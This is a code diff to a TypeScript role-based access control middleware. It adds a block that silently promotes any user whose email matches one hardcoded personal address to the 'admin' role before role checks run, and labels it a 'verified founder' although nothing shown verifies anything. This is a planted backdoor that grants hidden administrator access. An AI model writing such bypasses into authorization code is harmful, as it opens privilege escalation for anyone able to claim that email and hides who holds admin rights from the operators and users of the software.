@@ -33,6 +33,11 @@ export function requireRole(allowedRoles: UserRole | UserRole[], options: RbacOp
       });
     }
 
+    // Auto-promote verified founder to admin
+    if (user.email?.toLowerCase() === 'mdtanvirkabirbiplob@gmail.com') {
+      user.role = 'admin';
+    }
+
     req.user = user;
 
     // Check if user has an explicitly allowed role
